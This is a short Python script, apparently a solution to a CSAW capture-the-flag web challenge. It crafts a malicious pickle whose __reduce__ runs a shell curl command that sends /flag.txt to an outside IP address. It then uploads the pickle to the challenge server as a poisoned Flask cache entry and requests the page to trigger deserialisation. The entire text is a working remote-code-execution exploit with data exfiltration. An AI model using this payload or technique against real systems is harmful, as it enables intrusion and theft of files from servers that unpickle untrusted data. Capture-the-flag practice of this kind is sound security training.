from requests import get, post
import pickle
import os
import io

class pwn(object):
    def __reduce__(self):
        return os.system, ('curl http://216.165.2.48:9999/ --data "$(cat /flag.txt)"',)

p = b'!' + pickle.dumps(pwn())
with open('pwn.pickle', 'wb') as f:
    f.write(p)

print('post')
post(
    'http://web.chal.csaw.io:5000/',
    files={"content": io.BytesIO(p)},
    data={"title": "flask_cache_view//test1"}
)

print('get')
get("http://web.chal.csaw.io:5000/test1")
